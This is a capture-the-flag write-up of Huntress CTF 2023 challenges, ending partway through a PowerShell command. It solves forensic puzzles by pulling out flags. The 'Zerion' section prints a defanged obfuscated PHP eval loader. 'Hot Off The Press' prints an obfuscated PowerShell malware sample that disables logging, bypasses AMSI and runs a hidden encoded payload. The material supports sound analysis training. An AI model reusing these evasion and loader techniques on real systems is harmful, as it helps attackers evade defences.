---
start_at: 2023-10-02T16:00Z
end_at: 2023-11-01T03:59Z
links:
- https://huntress.ctf.games/
---

# Huntress CTF 2023

New challenges released every day.
This writeup is a short version.

## TOC

- [Notepad](#notepad)
- [Technical Support](#technical-support)
- [String Cheese](#string-cheese)
- [Read The Rules](#read-the-rules)
- [Query Code](#query-code)
- [Zerion](#zerion)
- [Book By Its Cover](#book-by-its-cover)
- [HumanTwo](#humantwo)
- [Hot Off The Press](#hot-off-the-press)
- [BaseFFFF+1](#baseffff1)
- [Traffic](#traffic)
- [CaesarMirror](#caesarmirror)
- [I Wont Let You Down](#i-wont-let-you-down)
- [Dialtone](#dialtone)
- [PHP Stager](#php-stager)
- [Layered Security](#layered-security)
- [Backdoored Splunk](#backdoored-splunk)
- [Dumpster Fire](#dumpster-fire)
- [Comprezz](#comprezz)
- [Chicken Wings](#chicken-wings)
- [Where am I?](#where-am-i)
- [F12](#f12)
- [Wimble](#wimble)
- [VeeBeeEee](#veebeeeee)
- [Baking](#baking)
- [Operation Not Found](#operation-not-found)
- [Snake Eater](#snake-eater)
- [Opendir](#opendir)
- [Under The Bridge](#under-the-bridge)
- [Land Before Time](#land-before-time)
- [Opposable Thumbs](#opposable-thumbs)
- [Rock, Paper, Psychic](#rock-paper-psychic)
- [Tragedy Redux](#tragedy-redux)
- [Rogue Inbox](#rogue-inbox)
- [M Three Sixty Five](#m-three-sixty-five)
- [Babel](#babel)
- [PRESS PLAY ON TAPE](#press-play-on-tape)
- [Indirect Payload](#indirect-payload)
- [Texas Chainsaw Massacre: Tokyo Drift](#texas-chainsaw-massacre-tokyo-drift)
- [Who is Real?](#who-is-real)
- [Thumb Drive](#thumb-drive)
- [Operation Eradication](#operation-eradication)
- [Speakfriend](#speakfriend)
- [Welcome to the Park](#welcome-to-the-park)
- [Snake Oil](#snake-oil)
- [RAT](#rat)
- [Batchfuscation](#batchfuscation)
- [Bad Memory](#bad-memory)
- [Discord Snowflake Scramble](#discord-snowflake-scramble)
- [BlackCat](#blackcat)
- [MFAtigue](#mfatigue)
- [Snake Eater II](#snake-eater-ii)

## Notepad

### Description

> Just a sanity check... you do know how to use a computer, right?
>
> Download the files below.
>
> Attachments: notepad

### Flag

flag{2dd41e3da37ef1238954d8e7f3217cd8}

### Solution

The flag is in the attached `notepad` file.

```console
root@kali:~/ctf/HuntressCTF/Notepad# cat notepad
+------------------------------------------------------+
| [✖] [□] [▬]  Notepad                              - |
|------------------------------------------------------|
| File   Edit   Format   View   Help                   |
|------------------------------------------------------|
|                                                      |
|                                                      |
|   New Text Document - Notepad                        |
|                                                      |
|     flag{2dd41e3da37ef1238954d8e7f3217cd8}           |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
+------------------------------------------------------+
| Ln 1, Col 40                                         |
+------------------------------------------------------+
```

## Technical Support

### Description

> Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?
>
> This CTF uses support tickets to help handle requests. If you need assistance, please create a ticket with the **#ctf-open-ticket** channel. You do not need to direct message any CTF organizers or facilitators, they will just tell you to open a ticket. You might find a flag in the ticket channel, though!
>
> Connect here:
>
> Join the Discord!

### Flag

flag{a98373a74abb8c5ebb8f5192e034a91c}

### Solution

Looking at `#ctf-open-ticket` channel, found flag in the message.

![flag_technical_support.png](img/flag_technical_support.png)

## String Cheese

### Description

> Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though...
>
> Download the file(s) below.
>
> Attachments: cheese.jpg

### Flag

flag{f4d9f0f70bf353f2ca23d81dcf7c9099}

### Solution

I got the flag by `strings` command.

```console
root@kali:~/ctf/HuntressCTF# strings cheese.jpg | grep flag
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```

## Read The Rules

### Description

> Please follow the rules for this CTF!
>
> Connect here:
>
> [Read The Rules](https://huntress.ctf.games/rules)

### Flag

flag{90bc54705794a62015369fd8e86e557b}

### Solution

The flag is in HTML source code.

```console
root@kali:~/ctf/HuntressCTF# curl -s https://huntress.ctf.games/rules | grep -oE 'flag{[0-9a-fA-F]{32}}'
flag{90bc54705794a62015369fd8e86e557b}
```

## Query Code

### Description

> What's this?
>
> Download the file(s) below.
>
> Attachments: query_code

### Flag

flag{3434cf5dc6a865657ea1ec1cb675ce3b}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file query_code
query_code: PNG image data, 111 x 111, 1-bit colormap, non-interlaced
```

The attached `query_code` file is PNG image and it's the following.

![query_code](img/query_code.png)

This file is QR Code, and therefore I decode it.
[`zbarimg`](https://github.com/mchehab/zbar) command is useful, which is provided by `zbar-tools` package in Debian-based distribution.

```console
root@kali:~/ctf/HuntressCTF# apt install zbar-tools
(snip)
root@kali:~/ctf/HuntressCTF# zbarimg query_code
QR-Code:flag{3434cf5dc6a865657ea1ec1cb675ce3b}

scanned 1 barcode symbols from 1 images in 0.04 seconds
```

## Zerion

### Description

> We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: zerion

### Flag

flag{af10370d485952897d5183aa09e19883}

### Solution

The attached file is obfuscated PHP code.

Beautified:

```php
<?php $L66Rgr = explode(base64_decode("Pz4="), file_get_contents(__FILE__));
$L6CRgr = [
    base64_decode("L3gvaQ=="),
    base64_decode("eA=="),
    base64_decode(strrev(str_rot13($L66Rgr[1]))),
];
$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
preg_replace($L6CRgr[0], serialize(eval($L6CRgr[2])), $L6CRgr[1]);
exit(); ?>
==Dstfmo (snip)
```

In L1, it reads the content of this file by using `file_get_contents(__FILE__)`.
`Pz4=` is Base64 encoded string and the decoded string is `?>`.
[`explode`](https://www.php.net/manual/en/function.explode.php) is the function to split a string.
Thus, `$L66Rgr[1]` is the string starting with `==Dstfmo` after `?>`.
In L5, `$L66Rgr[1]` is rotated by 13 places ([ROT13](`$L66Rgr[1]`)), reversed, and Base64 decoded.
Decoded it, got flag.

```console
root@kali:~/ctf/HuntressCTF# vi tmp.txt  # save the string starting with `==Dstfmo` after `?>`

root@kali:~/ctf/HuntressCTF# cat tmp.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d | grep -o 'flag{.*}'
flag{af10370d485952897d5183aa09e19883}
```

## Book By Its Cover

### Description

> They say you aren't supposed to judge a book by its cover, but this is one of my favorites!
>
> Download the file below.
>
> Attachments: book.rar

### Flag

flag{f8d32a346745a6c4bf4e9504ba5308f0}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file book.rar
book.rar: PNG image data, 800 x 200, 8-bit/color RGB, non-interlaced
```

The extension of attached filename is .rar, but it is PNG image file.

This PNG is the following:

![book.rar](img/book.rar.png)

I can copy it manually or use [tesseract](https://github.com/tesseract-ocr/tesseract) to extract the characters using OCR.

```console
root@kali:~/ctf/HuntressCTF# tesseract book.rar -
Estimating resolution as 372
flag {f8d32a346745a6c4bf4e9504ba5308f0}
```

## HumanTwo

### Description

> During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the human2.aspx webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: human2.aspx_iocs.zip

### Flag

flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}

### Solution

```console
root@kali:~/ctf/HuntressCTF# mkdir tmp

root@kali:~/ctf/HuntressCTF# unzip -d tmp human2.aspx_iocs.zip
Archive:  human2.aspx_iocs.zip
  inflating: tmp/ea0d98c023fb788809906e2d670e98d76d6f42b0efd76611ec698044876e5f3a
  inflating: tmp/f5983c8f11f4364774511065c11b23f9fcd46f2ddb23a88b8097cda816ef84a3
  inflating: tmp/4418fa01c8088d7176342225b0788c9ff74950624aed38aa210f90777765a3bf
```

The attached `human2.aspx_iocs.zip` file is zip archive.
Extracted it, many files were unzipped.

These file is similar to [C:\MOVEitTransfer\wwwroot\human2.aspx](https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643).
I'll try to find the diff.

```console
root@kali:~/ctf/HuntressCTF# curl -sLO https://gist.githubusercontent.com/JohnHammond/44ce8556f798b7f6a7574148b679c643/raw/35b0f4e4838b0e133386aa9ada3927048e5821ba/human2.aspx

root@kali:~/ctf/HuntressCTF# diff human2.aspx tmp/000ce897ff8a17528a3116dcf74380a8c67be7d11e9bff038397df4fdf5fc5f4
36c36
<     if (!String.Equals(pass, "REDACTEDREDACTEDREDACTEDREDACTED")) {
---
>     if (!String.Equals(pass, "e11320cf-f34b-4cc8-b4e3-46b4ad6e50ab")) {
```

The diff from original file is this line included `!String.Equals`.
Looking at this line in extracted files.

```console
root@kali:~/ctf/HuntressCTF# grep '!String.Equals' -R tmp
(snip)
tmp/e72b948380b8f7d7d797d2277176057f6b453e9a3a3dbdaa4ae04057d5497af0:    if (!String.Equals(pass, "709d4650-051e-4aa3-96eb-ddc750bc7250")) {
tmp/cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19:    if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000")) {
(snip)
```

`cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19` file is only difference from the others.
Unhexed it, got flag.

```python
>>> import binascii
>>> binascii.unhexlify("666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d-0000-0000-000000000000".replace("-", ""))
b'flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

#### References

- [MOVEit Transfer Critical Vulnerability CVE-2023-34362 Rapid Response](https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response)

## Hot Off The Press

### Description

> Oh wow, a malware analyst shared a sample that I [read about in the news!](https://www.huntress.com/blog/critical-vulnerabilities-ws_ftp-exploitation)
>
> But it looks like they put it in some weird kind of archive...? Anyway, the password should be infected as usual!
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: hot_off_the_press

### Flag

flag{dbfe5f755a898ce5f2088b0892850bf7}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file hot_off_the_press
hot_off_the_press: UHarc archive data
```

The attached `hot_off_the_press` file is UHArchive.
Extracting it in Windows10 with [UHARC CMD](https://sam.gleske.net/uharc/).

```powershell
C:\Program Files (x86)\UHARC CMD\bin>uharc.exe e -pw hot_off_the_press.uha

UHARC 0.6b  -----   high compression multimedia archiver   -----   BETA version
Copyright (c) 1997-2005 by Uwe Herklotz     All rights reserved     01 Oct 2005
****  Freeware for non-commercial use  ****  contact: uwe.herklotz@gmx.de  ****

Processing archive "hot_off_the_press.uha" (created: 02-Oct-2023, 23:24).
Using password.
Using 1.7 MB for decompression and 50 KB for file buffers.

Extracting 1 file (4918 bytes)
-------------------------------------------------------------------------------
Completed successfully (0.0 sec)                                   All files OK

C:\Program Files (x86)\UHARC CMD\bin>dir
 Volume in drive C has no label.
 Volume Serial Number is 4663-FA89

 Directory of C:\Program Files (x86)\UHARC CMD\bin

10/04/2023  08:31 AM    <DIR>          .
10/04/2023  08:31 AM    <DIR>          ..
10/04/2023  08:23 AM    <DIR>          Contrib
10/02/2023  11:24 PM             4,918 hot_off_the_press.ps1
10/04/2023  08:23 AM             2,841 hot_off_the_press.uha
06/06/2009  02:41 PM           496,128 makensis.exe
10/04/2023  08:23 AM    <DIR>          Plugins
10/04/2023  08:23 AM    <DIR>          Stubs
10/01/2005  08:00 AM           111,104 uharc.exe
               4 File(s)        614,991 bytes
               5 Dir(s)  89,786,978,304 bytes free
```

`hot_off_the_press.ps1` file is extracted and this file is obfuscated Powershell script.

hot_off_the_press.ps1

```powershell
C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''+''oX7zCWHxBjby+UR''+''jzwaTw4OWq''+''kQ{1}M''+''u8XW2''+''DtJM{1}''+''omtGI''+''TFM8he5nIGAnbP''+''rOfiSf''+''Cfat2qb8W''+''uPFW{0}rlufP''+''gOzYcaD''+''GTrnvKbeq/''+''SWj0tC/ftXN8U5''+''9Uj2+ST2''+''WGHp/nUiIqgFjuk''+''l+mGrCi/USDN2''+''hvuAJn8rqJY''+''13G9VBn''+''HhTcNHa''+''ChyQMx4''+''kul''+''nZ{0}{1}a''+''AT{1}Wcr0kZyUUMHa''+''tdwX0''+''7CAQkiW6RsTI''+''/nkx+N8bF''+''3{0}00''+''ljS''+''CaieWIPiyD''+''2JFfUiq''+''n704YNC''+''D6QS1+l{0}Q''+''OJyYJoq''+''t+AIM{0}U4Zs8''+''i/MWO4c''+''Fsi91olY1sJpbpS''+''mBYG''+''9Jl1OjxIG''+''eSa+jOO''+''5kl''+''g4pcngl''+''n5UalMy7''+''yJvPq''+''3o6eZs2mX''+''3zgbAHTX6PK''+''{1}Zr''+''qHp''+''GYRBy''+''f2JBdrbGoXIgVz''+''sgGbaNGe/Yf''+''1SmP1UhP1V''+''u0U''+''e8ZDToP''+''JRn0r''+''7tr0pj38q{1}''+''ReTuIjmNI''+''YjtaxF1G/''+''zFPjuWjAl{1}{1}GR''+''7UUc9{1}9Qy8''+''GIDgCB''+''q{1}nFb4qKZ6oHU''+''dUbnSbKWUB''+''CNvHiCb''+''oFQbbfO''+''xMHjJD78QORAhd3''+''sYs''+''1aa4O6''+''CU{0}nb''+''{1}upxdtVFIbz{1}v''+''SSzSTXF7+hbpg8c''+''gsIgdJ7QYs''+''lPJs6r+4K6T''+''Mkl9{0}5Glu''+''Yn5{1}5zFtC''+''0eJ1KkPgYVIbj''+''o{0}8''+''GnHlOIWO''+''QzDaC57''+''tOwnF5/Fo+Wxx''+''juG7S0wnhgj8''+''Kh{0}1Wq''+''CPQ0Swuz2g''+''fZiZYMIpTJjosT5''+''oV4''+''OBS7I''+''8st{0}4RAf8HRc''+''hPkGa+Q''+''KSHZchP''+''D3WdcWmRIhcTDR6''+''GM2fVfnHhy''+''6uTOtAQ''+''UwTGyvTVur''+''qXKfi0+P''+''W8sVI4WAGVwCI''+''lQn''+''AgeNb0{1}ftv{0}Dxjj''+''Q6dlh+/lvbyX''+''9/K/{0}22X+XG''+''vHr''+''RZ0mnV635''+''0N7''+''+6d''+''Pmob8sR''+''bf{0}gc+/2j''+''O6vT''+''ufHt856786''+''dO6lz{1}e5i''+''e302D2/PjuxV''+''tzFMr''+''xqfFqP{0}3nQU3''+''c1G''+''9zXmzq+''+''YGzn4P8b''+''iM7f''+''Rwf85lk''+''4+Nh8w5''+''36Q1Z17P6vn7''+''WP8h1gW2R/n+0''+''m2g8UuZ''+''M{0}M3kN7UYyHh''+''T17M5+aw22''+''ch1+GvZO{0}oc3+bF''+''+FX2jz''+''PmifrIOWvTq''+''nNhse''+''D91Ba+iPwsPD''+''D2ZlPKCx3G1M1{1}W''+''+qwhS''+''RWP+p/''+''2tS+Al6''+''ud4''+''Ipl5DC8H5HTl''+''FX3C''+''xUnB1{0}qcKg3DU''+''{1}x/''+''ASIGhvQYCXR5sd''+''mMcV+RxJzSIUP''+''NeaOisYNO''+''5tVzNZNsBM0''+''H9lh2HRyM''+''0{1}u8{0}{0}O7rH''+''oKcShnVu1ut1ZD''+''7le7q+3htfj6''+''pbX4cm3ktix''+''FHjNwNtZZZt2s''+''0CkxjDfHC9''+''8H{1}unK{0}xB7C''+''Tyce''+''4H0AvlOfukrCJ''+''ucs20A''+''i5Vt8''+''u{1}R''+''fghcHVc/Vq+''+''D{0}FPQxA7''+''c{1}{1}0q/rzFxrX0''+''+uz6TZOnIC8z/AX''+''/mDwPfb8YfVVC1a''+''wcoCfd''+''jzseiN/bIX''+''DpUYmCf''+''aRhDPKHwQtAFB''+''tmK8gqP{0}gbpsWn''+''Hspnq''+''dxx8''+''emlmODf2GZMc5''+''4PA''+''AA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```

Extract `$x_wa3=((' ...`

```powershell
$x_wa3 = (('Sc' + ' { 2 }i' + 'pt { 1 }loc { 0 }Logg' + 'in' + 'g') -f 'k', 'B', 'r');
If ($PSVersionTable.PSVersion.Major -ge 3) {
    $sw = (('E' + 'nable { 3 }' + 'c { ' + '1 }' + 'ip { 0 }Bloc { 2 }Logging' + '') -f 't', 'r', 'k', 'S');
    $p8 = [Collections.Generic.Dictionary[string, System.Object]]::new();
    $gG0 = (('Ena' + 'ble { 2 }c { 5 }i { 3 }t { ' + '4 }loc' + ' { 0 } { 1 }' + 'nv' + 'o' + 'cationLoggi' + 'ng') -f 'k', 'I', 'S', 'p', 'B', 'r');
    $jXZ4D = [Ref].Assembly.GetType(((' { 0 }y' + 's' + 'tem. { 1 }a' + 'n' + 'a { 4 }ement.A { 5 }t' + 'omati' + 'on. { 2' + ' }ti { 3 }s') -f 'S', 'M', 'U', 'l', 'g', 'u'));
    $plhF = [Ref].Assembly.GetType(((' { ' + '6 } { ' + '5 }stem.' + ' { ' + '3' + ' } { 9 }' + 'n { 9 } { ' + '2 }ement' + '. { ' + '8 } { ' + '4 }t { ' + '7' + ' }' + 'm { 9 }ti { 7 }n' + '.' + ' { 8' + ' }' + 'm' + 'si { 0' + ' }ti { ' + '1 }s') -f 'U', 'l', 'g', 'M', 'u', 'y', 'S', 'o', 'A', 'a'));
    if ($plhF) { $plhF.GetField((('' + 'a { ' + '0 }' + 'si { 4 }' + 'nit { ' + '1 }' + 'ai' + 'l { 2 } { ' + '3 }') -f 'm', 'F', 'e', 'd', 'I'), 'NonPublic, Static').SetValue($null, $true); };
    $lCj = $jXZ4D.GetField('cachedGroupPolicySettings', 'NonPublic, Static');
    If ($lCj) {
        $a938 = $lCj.GetValue($null);
        If ($a938[$x_wa3]) {
            $a938[$x_wa3][$sw] = 0;
            $a938[$x_wa3][$gG0] = 0;
        } $p8.Add($gG0, 0); $p8.Add($sw, 0); $a938['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $x_wa3] = $p8;
    }
    Else {
        [Ref].Assembly.GetType((('S { 2 } { 3 }' + 't' + 'em' + '.Mana' + 'ge' + 'ment. { ' + '5 } { 4 }to' + 'mation.Scr' + 'ipt { 1 }loc { 0 }') -f 'k', 'B', 'y', 's', 'u', 'A')).GetField('signatures', 'NonPublic, Static').SetValue($null, (New-Object Collections.Generic.HashSet[string]));
    }
};
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String((('H4sI' + 'AIeJ' + 'G2UC/+1X' + 'bU/jOBD+3l9hrS' + 'IlkU { 0 }' + 'VFvb { 1 }IiFdWqD' + 'bPRJKS8vR' + 'brUKy' + 'TR168TFcQplb//7' + 'jfNSygJ73 { 1 }lI94F' + 'IVvwyMx4/M' + '7YfT9PYl5TH' + 'hH7sku8VUnxd' + 'T3gRMTT/ku' + '/fWUSjS3Mzp' + 'oX7zCWHxBjby+UR' + 'jzwaTw4OWq' + 'kQ { 1 }M' + 'u8XW2' + 'DtJM { 1 }' + 'omtGI' + 'TFM8he5nIGAnbP' + 'rOfiSf' + 'Cfat2qb8W' + 'uPFW { 0 }rlufP' + 'gOzYcaD' + 'GTrnvKbeq/' + 'SWj0tC/ftXN8U5' + '9Uj2+ST2' + 'WGHp/nUiIqgFjuk' + 'l+mGrCi/USDN2' + 'hvuAJn8rqJY' + '13G9VBn' + 'HhTcNHa' + 'ChyQMx4' + 'kul' + 'nZ { 0 } { 1 }a' + 'AT { 1 }Wcr0kZyUUMHa' + 'tdwX0' + '7CAQkiW6RsTI' + '/nkx+N8bF' + '3 { 0 }00' + 'ljS' + 'CaieWIPiyD' + '2JFfUiq' + 'n704YNC' + 'D6QS1+l { 0 }Q' + 'OJyYJoq' + 't+AIM { 0 }U4Zs8' + 'i/MWO4c' + 'Fsi91olY1sJpbpS' + 'mBYG' + '9Jl1OjxIG' + 'eSa+jOO' + '5kl' + 'g4pcngl' + 'n5UalMy7' + 'yJvPq' + '3o6eZs2mX' + '3zgbAHTX6PK' + ' { 1 }Zr' + 'qHp' + 'GYRBy' + 'f2JBdrbGoXIgVz' + 'sgGbaNGe/Yf' + '1SmP1UhP1V' + 'u0U' + 'e8ZDToP' + 'JRn0r' + '7tr0pj38q { 1 }' + 'ReTuIjmNI' + 'YjtaxF1G/' + 'zFPjuWjAl { 1 } { 1 }GR' + '7UUc9 { 1 }9Qy8' + 'GIDgCB' + 'q { 1 }nFb4qKZ6oHU' + 'dUbnSbKWUB' + 'CNvHiCb' + 'oFQbbfO' + 'xMHjJD78QORAhd3' + 'sYs' + '1aa4O6' + 'CU { 0 }nb' + ' { 1 }upxdtVFIbz { 1 }v' + 'SSzSTXF7+hbpg8c' + 'gsIgdJ7QYs' + 'lPJs6r+4K6T' + 'Mkl9 { 0 }5Glu' + 'Yn5 { 1 }5zFtC' + '0eJ1KkPgYVIbj' + 'o { 0 }8' + 'GnHlOIWO' + 'QzDaC57' + 'tOwnF5/Fo+Wxx' + 'juG7S0wnhgj8' + 'Kh { 0 }1Wq' + 'CPQ0Swuz2g' + 'fZiZYMIpTJjosT5' + 'oV4' + 'OBS7I' + '8st { 0 }4RAf8HRc' + 'hPkGa+Q' + 'KSHZchP' + 'D3WdcWmRIhcTDR6' + 'GM2fVfnHhy' + '6uTOtAQ' + 'UwTGyvTVur' + 'qXKfi0+P' + 'W8sVI4WAGVwCI' + 'lQn' + 'AgeNb0 { 1 }ftv { 0 }Dxjj' + 'Q6dlh+/lvbyX' + '9/K/ { 0 }22X+XG' + 'vHr' + 'RZ0mnV635' + '0N7' + '+6d' + 'Pmob8sR' + 'bf { 0 }gc+/2j' + 'O6vT' + 'ufHt856786' + 'dO6lz { 1 }e5i' + 'e302D2/PjuxV' + 'tzFMr' + 'xqfFqP { 0 }3nQU3' + 'c1G' + '9zXmzq+' + 'YGzn4P8b' + 'iM7f' + 'Rwf85lk' + '4+Nh8w5' + '36Q1Z17P6vn7' + 'WP8h1gW2R/n+0' + 'm2g8UuZ' + 'M { 0 }M3kN7UYyHh' + 'T17M5+aw22' + 'ch1+GvZO { 0 }oc3+bF' + '+FX2jz' + 'PmifrIOWvTq' + 'nNhse' + 'D91Ba+iPwsPD' + 'D2ZlPKCx3G1M1 { 1 }W' + '+qwhS' + 'RWP+p/' + '2tS+Al6' + 'ud4' + 'Ipl5DC8H5HTl' + 'FX3C' + 'xUnB1 { 0 }qcKg3DU' + ' { 1 }x/' + 'ASIGhvQYCXR5sd' + 'mMcV+RxJzSIUP' + 'NeaOisYNO' + '5tVzNZNsBM0' + 'H9lh2HRyM' + '0 { 1 }u8 { 0 } { 0 }O7rH' + 'oKcShnVu1ut1ZD' + '7le7q+3htfj6' + 'pbX4cm3ktix' + 'FHjNwNtZZZt2s' + '0CkxjDfHC9' + '8H { 1 }unK { 0 }xB7C' + 'Tyce' + '4H0AvlOfukrCJ' + 'ucs20A' + 'i5Vt8' + 'u { 1 }R' + 'fghcHVc/Vq+' + 'D { 0 }FPQxA7' + 'c { 1 } { 1 }0q/rzFxrX0' + '+uz6TZOnIC8z/AX' + '/mDwPfb8YfVVC1a' + 'wcoCfd' + 'jzseiN/bIX' + 'DpUYmCf' + 'aRhDPKHwQtAFB' + 'tmK8gqP { 0 }gbpsWn' + 'Hspnq' + 'dxx8' + 'emlmODf2GZMc5' + '4PA' + 'AA=') -f 'L', 'E')))), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

In kali:

```console
┌──(root㉿kali)-[/root/ctf/HuntressCTF]
└─PS> 'H4sI' + 'AIeJ' + 'G2UC/+1X' + 'bU/jOBD+3l9hrS' + 'IlkU { 0 }' + 'VFvb { 1 }IiFdWqD' + 'bPRJKS8vR' + 'brUKy' + 'TR168TFcQplb//7' + 'jfNSygJ73 { 1 }lI94F' + 'IVvwyMx4/M' + '7YfT9PYl5TH' + 'hH7sku8VUnxd' + 'T3gRMTT/ku' + '/fWUSjS3Mzp' + 'oX7zCWHxBjby+UR' + 'jzwaTw4OWq' + 'kQ { 1 }M' + 'u8XW2' + 'DtJM { 1 }' + 'omtGI' + 'TFM8he5nIGAnbP' + 'rOfiSf' + 'Cfat2qb8W' + 'uPFW { 0 }rlufP' + 'gOzYcaD' + 'GTrnvKbeq/' + 'SWj0tC/ftXN8U5' + '9Uj2+ST2' + 'WGHp/nUiIqgFjuk' + 'l+mGrCi/USDN2' + 'hvuAJn8rqJY' + '13G9VBn' + 'HhTcNHa' + 'ChyQMx4' + 'kul' + 'nZ { 0 } { 1 }a' + 'AT { 1 }Wcr0kZyUUMHa' + 'tdwX0' + '7CAQkiW6RsTI' + '/nkx+N8bF' + '3 { 0 }00' + 'ljS' + 'CaieWIPiyD' + '2JFfUiq' + 'n704YNC' + 'D6QS1+l { 0 }Q' + 'OJyYJoq' + 't+AIM { 0 }U4Zs8' + 'i/MWO4c' + 'Fsi91olY1sJpbpS' + 'mBYG' + '9Jl1OjxIG' + 'eSa+jOO' + '5kl' + 'g4pcngl' + 'n5UalMy7' + 'yJvPq' + '3o6eZs2mX' + '3zgbAHTX6PK' + ' { 1 }Zr' + 'qHp' + 'GYRBy' + 'f2JBdrbGoXIgVz' + 'sgGbaNGe/Yf' + '1SmP1UhP1V' + 'u0U' + 'e8ZDToP' + 'JRn0r' + '7tr0pj38q { 1 }' + 'ReTuIjmNI' + 'YjtaxF1G/' + 'zFPjuWjAl { 1 } { 1 }GR' + '7UUc9 { 1 }9Qy8' + 'GIDgCB' + 'q { 1 }nFb4qKZ6oHU' + 'dUbnSbKWUB' + 'CNvHiCb' + 'oFQbbfO' + 'xMHjJD78QORAhd3' + 'sYs' + '1aa4O6' + 'CU { 0 }nb' + ' { 1 }upxdtVFIbz { 1 }v' + 'SSzSTXF7+hbpg8c' + 'gsIgdJ7QYs' + 'lPJs6r+4K6T' + 'Mkl9 { 0 }5Glu' + 'Yn5 { 1 }5zFtC' + '0eJ1KkPgYVIbj' + 'o { 0 }8' + 'GnHlOIWO' + 'QzDaC57' + 'tOwnF5/Fo+Wxx' + 'juG7S0wnhgj8' + 'Kh { 0 }1Wq' + 